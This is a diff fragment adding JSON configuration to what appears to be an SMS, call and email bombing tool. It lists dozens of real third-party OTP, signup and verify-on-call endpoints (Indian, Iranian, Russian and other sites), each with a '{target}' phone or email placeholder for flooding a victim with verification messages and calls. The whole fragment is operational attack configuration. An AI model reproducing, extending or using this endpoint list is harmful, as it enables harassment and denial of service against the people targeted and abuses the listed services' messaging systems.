+                    "url": "https://www.gapoon.com/userSignup",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_92",
+                    "method": "POST",
+                    "url": "https://www.hamrah-mechanic.com/api/v1/membership/otp",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_93",
+                    "method": "POST",
+                    "url": "https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_94",
+                    "method": "POST",
+                    "url": "https://www.icq.com/smsreg/requestPhoneValidation.php",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_95",
+                    "method": "GET",
+                    "url": "https://www.miare.ir/p/restaurant/#/login?phone=0{target}",
+                    "headers": {}
+                },
+                {
+                    "name": "sms_api_96",
+                    "method": "POST",
+                    "url": "https://www.mylescars.com/usermanagements/chkContact",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_97",
+                    "method": "POST",
+                    "url": "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_98",
+                    "method": "POST",
+                    "url": "https://www.pateh.com",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_99",
+                    "method": "POST",
+                    "url": "https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_100",
+                    "method": "POST",
+                    "url": "https://www.treebo.com/api/v2/auth/login/otp/",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                },
+                {
+                    "name": "sms_api_101",
+                    "method": "POST",
+                    "url": "https://youla.ru/web-api/auth/request_code",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your OTP is 123456"
+                    }
+                }
+            ],
+            "call": [
+                {
+                    "name": "call_api_1",
+                    "method": "POST",
+                    "url": "https://api.magicbricks.com/bricks/verifyOnCall.html",
+                    "headers": {
+                        "Content-Type": "application/json"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your verification code is 123456"
+                    }
+                },
+                {
+                    "name": "call_api_2",
+                    "method": "POST",
+                    "url": "https://www.careers360.com/ajax/no-cache/user/otp-send",
+                    "headers": {
+                        "Content-Type": "application/json"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your verification code is 123456"
+                    }
+                },
+                {
+                    "name": "call_api_3",
+                    "method": "GET",
+                    "url": "https://www.makaan.com/apis/nc/sendOtpOnCall/16257065/{target}",
+                    "headers": {}
+                },
+                {
+                    "name": "call_api_4",
+                    "method": "POST",
+                    "url": "https://www.realestateindia.com/mobile-script/indian_mobile_verification_form.php",
+                    "headers": {
+                        "Content-Type": "application/json"
+                    },
+                    "body_template": {
+                        "phone": "{target}",
+                        "message": "Your verification code is 123456"
+                    }
+                }
+            ]
+        },
+        "email": {
+            "email": [
+                {
+                    "name": "email_api_1",
+                    "method": "POST",
+                    "url": "https://mycredible.info:443/mycredible/signin/request_otp",
+                    "headers": {
+                        "Content-Type": "application/json"
+                    },
+                    "body_template": {
+                        "email": "{target}",
+                        "type": "verification"
+                    }
+                },
+                {
+                    "name": "email_api_2",
+                    "method": "POST",
+                    "url": "https://mycredible.info:443/mycredible/signup",
+                    "headers": {
+                        "Content-Type": "application/json"
+                    },
+                    "body_template": {
+                        "email": "{target}",
+                        "type": "verification"
+                    }
+                },
+                {
+                    "name": "email_api_3",
+                    "method": "POST",
+                    "url": "https://themezee.com/wp-admin/admin-ajax.php?action=mc4wp-form",
+                    "headers": {
+                        "Content-Type": "application/json"
+                    },
+                    "body_template": {
+                        "email": "{target}",
+                        "type": "verification"
+                    }
+                }
+            ]
+        }
+    }
+}
